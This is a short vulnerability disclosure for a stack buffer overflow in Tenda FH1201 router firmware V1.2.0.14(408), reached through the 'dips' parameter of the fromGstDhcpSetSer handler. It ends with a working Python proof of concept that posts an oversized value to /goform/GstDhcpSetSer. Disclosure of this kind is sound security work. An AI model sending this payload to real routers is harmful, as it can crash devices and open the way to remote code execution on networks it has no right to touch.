# Tenda FH1201 fromGstDhcpSetSer
### Overview
vendor: Tenda

product: FH1201

version: V1.2.0.14(408)

type: Stack Overflow
### Vulnerability Description
Tenda FH1201 V1.2.0.14(408) were discovered to contain a stack overflow via the dips parameter in the fromGstDhcpSetSer function.
### Vulnerability details
In function fromGstDhcpSetSer line 41, it reads in a user-provided parameter `dips`, and the variable is passed to the `strncpy` function without any length check, which may overflow the stack-based buffer `dest`. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](images/1.png)

### POC
```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/GstDhcpSetSer"

data = {
    "dips": "a" * 4000 + ".b",
}

response = requests.post(url, data=data)
print(response.text)
```

![](images/2.png)
